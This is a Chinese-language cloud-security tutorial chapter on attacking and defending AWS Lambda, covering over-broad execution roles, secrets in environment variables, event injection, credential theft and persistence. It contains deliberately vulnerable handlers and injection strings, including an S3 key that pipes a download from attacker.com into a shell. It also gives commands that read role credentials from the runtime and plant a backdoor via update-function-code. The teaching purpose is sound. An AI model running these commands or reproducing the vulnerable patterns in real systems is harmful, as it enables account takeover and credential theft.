# Ch 11 — Serverless（Lambda）：事件注入與過度權限

> **目標**：理解 Lambda 執行模型的攻擊面，掌握 execution role 過度授權、環境變數洩漏 secret、event injection 三條主要攻擊路徑，以及從 Lambda 執行環境拿憑證的技術細節，並對應防禦措施。

---

## 為什麼需要

Serverless 的賣點是「不管伺服器」，但這個說法很容易讓人以為攻擊面也消失了。現實是攻擊面只是換了形狀：沒有 OS 要打 patch，但多了 IAM role 設定、event input 處理、環境變數管理這三個容易搞砸的點。

傳統 web server 被打穿，攻擊者取得的是機器上的 shell 和當前帳號的權限。Lambda 被打穿，攻擊者取得的是 execution role 這個 IAM role 的臨時憑證，而這個 role 常常被給了整個帳號的 S3 全開，或更直接地給了 `AdministratorAccess`。單一 function 的 RCE，直接升格為帳號接管。

此外，Lambda 的事件驅動模型讓注入問題更隱蔽。API Gateway 後面的 Lambda 處理 HTTP input 是大家理解的；但 S3 上傳事件觸發 Lambda、SQS 訊息觸發 Lambda，這些 event source 裡的資料同樣可以是攻擊者控制的。物件名稱、訊息內容、metadata——只要 function 把這些當可信輸入，注入面就存在。

---

## 先建直覺

Lambda 的執行模型：你寫一個 function，AWS 替你在隔離的 micro VM（Firecracker）裡跑它。每次有 event 來，AWS 起一個執行環境（或複用上次凍結的），把 event JSON 傳進你的 handler，跑完後凍結等下次。

重點在 execution role：每個 Lambda function 掛一個 IAM role，AWS 在起執行環境時，把這個 role 的臨時憑證（`AWS_ACCESS_KEY_ID`、`AWS_SECRET_ACCESS_KEY`、`AWS_SESSION_TOKEN`）注入進環境變數。你的程式碼呼叫 AWS SDK 時，SDK 自動讀這幾個環境變數當身分。

```
[觸發器：API GW / S3 / SQS / ...]
        │
        │  event (JSON)
        ▼
┌─────────────────────────────────┐
│  Lambda Function (micro VM)     │
│                                 │
│  handler(event, context) {      │
│    // 你的程式碼                 │
│    // 環境變數：DB_PASSWORD=xxx  │  ← 常見 secret 洩漏位置
│    // /tmp/  (512MB 臨時磁碟)   │
│  }                              │
│                                 │
│  execution role: webapp-role    │  ← IAM role 常過寬
│  AWS_ACCESS_KEY_ID=ASIA...      │  ← 來自 execution role
│  AWS_SECRET_ACCESS_KEY=...      │
│  AWS_SESSION_TOKEN=...          │
└─────────────────────────────────┘
        │
        │  呼叫 AWS API
        ▼
[S3 / DynamoDB / SQS / 其他 AWS 服務]
```

攻擊者的目標很明確：進到這個 micro VM 的執行環境，或讀到環境變數，就能拿走 execution role 的身分。

---

## 底層機制

### Execution Role（執行角色）過度授權

最常見的問題，也最容易被忽略。開發者在 function 用到 S3，最省事的做法是給整個帳號的 S3 `*` 權限；更糟的直接給 `AdministratorAccess`，「先讓它跑起來，之後再收緊」，然後之後永遠沒來。

攻擊者視角：不需要在 function 裡 RCE，只要能控制 function 的輸入讓它做某件事（比如 SSRF 讀內部 metadata），或者直接拿到 execution role 憑證（見後面「從 Lambda 環境拿憑證」段落），execution role 的所有能力全部繼承。一個過度授權的 role 讓單點突破變成帳號危機。

### 環境變數藏 Secret

把 DB 密碼、API key、JWT secret 塞進 Lambda 環境變數是常見做法，也是常見問題。

危險在於環境變數存在 Lambda 設定層。任何有 `lambda:GetFunction` 或 `lambda:GetFunctionConfiguration` 權限的人，都可以在不觸發 function 的情況下把所有環境變數拉出來：

```bash
# 需要 lambda:GetFunctionConfiguration 權限
# **本段未實測，為理論預期行為**
aws lambda get-function-configuration \
  --function-name my-api-function \
  --query 'Environment.Variables'
# 輸出：{"DB_PASSWORD": "super_secret", "API_KEY": "hardcoded_key"}
```

**自驗方法**：在自己帳號建一個測試 Lambda function，把 `TEST_SECRET=fake_password_123` 放進環境變數，用上面指令確認能拉出來。不需要跑 function，只要有 `GetFunctionConfiguration` 就夠。

這條路的攻擊鏈很短：拿到一個被過度授權的帳號 credential → 列出 Lambda functions → 對每個 function 拉環境變數 → 收割 secrets。

### Event Injection（事件注入）

Lambda handler 接收 event JSON 作為輸入。這個 JSON 的內容來自觸發器，觸發器的來源可以是攻擊者控制的。

常見注入場景：

- **API Gateway → Lambda**：HTTP request body、query string、path parameter 成為 event 欄位，等同於傳統 web 層的輸入注入
- **S3 event → Lambda**：攻擊者上傳一個物件，物件的 key（路徑名稱）成為 event 欄位，若 function 用 key 組命令就出事
- **SQS → Lambda**：任何能往 SQS 送訊息的人都能控制 event body

易受注入的 Python 寫法示意：

```python
# 危險寫法（示意，不可用於生產）
def handler(event, context):
    username = event['body']['username']
    # 直接把 event 欄位拼進 SQL
    query = f"SELECT * FROM users WHERE name='{username}'"
    # 攻擊者傳入：username = "admin'; DROP TABLE users; --"
    conn.execute(query)
    ...
```

S3 key 注入示意：

```python
# 危險寫法（示意，不可用於生產）
def handler(event, context):
    key = event['Records'][0]['s3']['object']['key']
    # 用 key 組 shell 命令
    os.system(f"convert /tmp/{key} /tmp/output.png")
    # 攻擊者上傳一個叫做 "x; curl attacker.com | sh #" 的物件
```

修正方向：把 event 欄位當不可信輸入，做白名單驗證，用 parameterized query，不拼 shell 命令。

### 從 Lambda 執行環境拿 Execution Role 憑證

這是 Lambda RCE 之後必做的動作。AWS 在起執行環境時，已經把 execution role 的臨時憑證塞進環境變數，所以在執行環境裡（透過 RCE 或 function 本身有命令執行功能）：

```bash
# 在 Lambda 執行環境內
echo $AWS_ACCESS_KEY_ID      # ASIA 開頭的臨時 access key
echo $AWS_SECRET_ACCESS_KEY
echo $AWS_SESSION_TOKEN
```

或讀 `/proc/self/environ`（不需要 shell，只要能 read file）：

```bash
cat /proc/self/environ | tr '\0' '\n' | grep AWS
```

備用路徑：ECS credential endpoint。Lambda 執行環境使用和 ECS 相同的憑證發放機制，環境變數 `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` 指向一個 link-local endpoint：

```bash
# 打這個 endpoint 拿 execution role 的憑證 JSON
curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
# 回傳：{"AccessKeyId": "ASIA...", "SecretAccessKey": "...", "Token": "...", "Expiration": "..."}
```

這和 Ch 5 講的 ECS 憑證端點機制相同。拿到 `ASIA...` 開頭的 access key 加上 session token，在 function 外部用 `aws configure set` 設定後，完全等同 execution role 的身分，可以做這個 role 能做的一切，且有效期通常是數小時。

**本段機制來自 AWS Lambda 官方執行模型文件，`AWS_ACCESS_KEY_ID` 等環境變數確為 Lambda 執行時注入的標準行為。實際 RCE 場景依 function 程式碼的具體漏洞而定。**

### Lambda 持久化

拿到帳號後，攻擊者可以用 Lambda 做持久化：

**本段未實測，為理論預期行為**

- 修改現有 function 程式碼（插入後門）：`aws lambda update-function-code --function-name xxx --zip-file fileb://backdoor.zip`
- 修改 Lambda Layer（Layer 是共用程式庫層，一個 Layer 被多個 function 共用，改一個後門可以影響所有使用它的 function）
- 加新的 trigger（讓後門 function 在更多事件下被觸發）
- 後門 function 每次被合法業務事件觸發時，順帶跑攻擊者的 payload

**自驗方法**：建一個測試 function，執行 `update-function-code`，到 CloudTrail 裡找 `UpdateFunctionCode` event，確認這個操作留下紀錄。

---

## 好壞 Role Policy 對照

壞的（過度授權，常見於「先讓它跑起來」的情況）：

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
```

好的（最小授權，這個 function 只需要讀特定 S3 prefix）：

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "ReadSpecificS3Prefix",
      "Effect": "Allow",
      "Action": [
        "s3:GetObject"
      ],
      "Resource": "arn:aws:s3:::my-data-bucket/processed/*"
    },
    {
      "Sid": "AllowLogging",
      "Effect": "Allow",
      "Action": [
        "logs:CreateLogGroup",
        "logs:CreateLogStream",
        "logs:PutLogEvents"
      ],
      "Resource": "arn:aws:logs:*:123456789012:log-group:/aws/lambda/my-function:*"
    }
  ]
}
```

兩個 policy 的差距：第一個讓 function 擁有帳號內所有資源的所有操作權；第二個 function 只能讀 `my-data-bucket/processed/` 下的物件，以及寫自己的 CloudWatch log。

---

## 對比取捨表

| 做法 | Secret 洩漏風險 | 存取控制 | CloudTrail 可見性 | 推薦程度 |
|------|----------------|----------|-------------------|----------|
| 環境變數直接存 secret | 高（`GetFunctionConfiguration` 可讀） | 無額外控制 | 無存取紀錄 | 不推薦 |
| SSM Parameter Store（SecureString） | 低 | 需 `ssm:GetParameter` | 每次存取有紀錄 | 可用 |
| AWS Secrets Manager | 低 | 需 `secretsmanager:GetSecretValue` | 每次存取有紀錄，支援自動輪換 | 推薦 |
| 環境變數 + KMS 加密 | 中（靜態加密，但 `GetFunctionConfiguration` 仍回明文） | 無額外控制 | 無存取紀錄 | 有誤解，不推薦 |

| Role 設計 | 爆炸半徑 | 維護成本 | 推薦程度 |
|-----------|---------|---------|---------|
| 所有 function 共用一個 role | 一個 function 被打穿 = 所有 function 的權限 | 低 | 不推薦 |
| 每個 function 一個 role，最小授權 | 爆炸半徑侷限於單一 function 的需求 | 中 | 推薦 |
| 用 IAM Access Analyzer 驗證 | 可發現未使用的過寬授權 | 略高 | 推薦搭配上條 |

---

## 踩雷集錦

1. **錯誤直覺**：Lambda 是無伺服器，沒有伺服器就沒有攻擊面。→ **正確認識**：Lambda 有 IAM role、有環境變數、有 event 輸入，攻擊面只是轉移不是消失；execution role 過度授權的影響甚至比傳統 server 被打穿更廣。

2. **錯誤直覺**：環境變數有設 KMS 加密，secret 是安全的。→ **正確認識**：Lambda 環境變數的「加密」是指靜態加密（data at rest），呼叫 `GetFunctionConfiguration` 時 AWS 仍然回傳明文值。真正需要保護的 secret 要放 Secrets Manager，並在 function 執行時才用 IAM 授權的 API 去拿。

3. **錯誤直覺**：每次 invocation 都是全新環境，攻擊者拿到的憑證馬上就沒用了。→ **正確認識**：execution role 憑證是 STS 臨時憑證，有效期通常是 1-6 小時，和 invocation 的生命週期無關。攻擊者在 function 外部拿到這組憑證後可以持續使用到憑證過期。

4. **錯誤直覺**：只要 function code 沒有漏洞，Lambda 就安全。→ **正確認識**：execution role 過度授權本身就是攻擊面，不需要打進 function 執行環境。任何拿到 `lambda:GetFunctionConfiguration` 的人可以讀走環境變數裡的 secret；拿到 `lambda:InvokeFunction` 的人可以觸發 function 用它的 role 做事。

---

## 防禦重點整理

- **Execution role least privilege**：每個 function 一個 role，用 IAM Access Analyzer 定期掃描找過寬的 role，不給 managed policy `AdministratorAccess` 或 `PowerUserAccess`
- **不放 secret 在環境變數**：改用 AWS Secrets Manager（`secretsmanager:GetSecretValue`）或 SSM Parameter Store，function 在執行時才拉，存取有 CloudTrail 紀錄
- **把 event 當不可信輸入**：對所有從 event 來的欄位做型別檢查和白名單驗證，不拼 SQL/shell 命令
- **CloudTrail 監控高風險操作**：`UpdateFunctionCode`、`AddPermission`、`CreateEventSourceMapping`、`GetFunctionConfiguration`——這些操作出現在非部署時段要告警
- **VPC 設定**：Lambda 預設不在 VPC 裡，能直接打 internet（包括 metadata 端點和外部 C2）；需要隔離的 function 要手動設進 VPC 並配合 security group

---

## 進階延伸

- **Lambda SnapStart**（Java）：為了加速冷啟動而做的 snapshot 機制，snapshot 裡可能包含執行環境的狀態（包括記憶體），snapshot 的存取控制是額外的攻擊面
- **Lambda Extension**：Extension 和 function 跑在同一個執行環境，惡意的第三方 Extension 能讀取所有環境變數包含 AWS 憑證
- **Container Image Lambda**：Lambda 可以用 container image 部署，這條路的攻擊面加入了 container image 的 supply chain 問題，ECR image 的掃描和簽名也需要納入
- **EventBridge + Lambda**：EventBridge rule 可以跨帳號觸發 Lambda，跨帳號信任關係設定不當是另一個攻擊面
- **Pacu**（AWS 攻擊框架）的 Lambda 模組：`lambda__backdoor_new_roles`、`lambda__enum`，了解攻擊者工具的視角有助於防禦設計

---

## 本章重點整理

- Lambda execution role 是核心攻擊面：role 過度授權讓單一 function 的 RCE 升格為帳號接管
- 環境變數不是 secret 存放處：`GetFunctionConfiguration` 不需要進執行環境就能讀走所有環境變數
- Event 是攻擊者可控的輸入：API Gateway、S3、SQS 等 trigger 都可能帶著攻擊者的 payload
- 在 Lambda 執行環境內，`AWS_ACCESS_KEY_ID` 等憑證已被 AWS 自動注入進環境變數，RCE 後直接讀走
- ECS credential endpoint（`169.254.170.2`）是 Lambda 發放憑證的底層機制，和 Ch 5 ECS 情境相同
- 防禦三重點：role 最小授權、secret 放 Secrets Manager、event 當不可信輸入

---

## 自我檢核

- [ ] 說明 Lambda execution role 和 IAM user 的差異，以及臨時憑證的有效期概念
- [ ] 說出為什麼把 secret 放環境變數不安全，`GetFunctionConfiguration` 的 IAM permission 要求是什麼
- [ ] 畫出「攻擊者控制 S3 object key → event injection → Lambda 執行任意命令」的攻擊鏈
- [ ] 列出在 Lambda 執行環境內拿 execution role 憑證的兩條路徑（環境變數路徑和 ECS endpoint 路徑）
- [ ] 寫出「每個 function 只需讀特定 S3 prefix」的最小授權 policy 結構
- [ ] 說明 Lambda 環境變數的 KMS 加密保護的是什麼、不保護什麼

---

## 延伸閱讀

1. **AWS Lambda Security Overview（AWS 官方文件）**：`https://docs.aws.amazon.com/lambda/latest/dg/lambda-security.html`——Lambda 執行模型、execution role、VPC 設定的官方說明，是本章所有機制的一手來源，讀完能驗證本章的理論預期行為。

2. **Rhino Security Labs：Abusing AWS Lambda Functions for Privilege Escalation**：搜尋 "rhino security lambda privilege escalation"——從攻擊者視角系統梳理 Lambda 的橫向移動和提權技術，直接對應本章的 execution role 和持久化段落。

3. **DataDog Security Labs：Lambda attack paths**：搜尋 "datadog lambda attack paths"——用真實 CTF 場景說明 Lambda event injection 到 credential 外洩的完整攻擊鏈，和本章 event injection 段落直接呼應。

4. **Pacu GitHub（rhinosecuritylabs/pacu）**：`https://github.com/RhinoSecurityLabs/pacu`——AWS 攻擊框架，Lambda 模組（`lambda__enum`、`lambda__backdoor_new_roles`）讀 source code 能理解攻擊者自動化的方式，對設計 CloudTrail 告警規則有幫助。

5. **AWS re:Invent Security Best Practices for AWS Lambda**：搜尋 "aws reinvent lambda security best practices"——官方從防禦角度的完整建議，含 IAM、VPC、code 層面，是本章防禦重點的系統化版本。

---

Lambda 的 secret 問題指向了一個更大的主題：密鑰本身要怎麼管。下一章進 KMS 和 Secrets Manager，看密鑰管理的正確做法和常見洩漏面。

→ [Ch 12 密鑰與 secrets：KMS / Secrets Manager / 洩漏面](./12-secrets-kms.md)
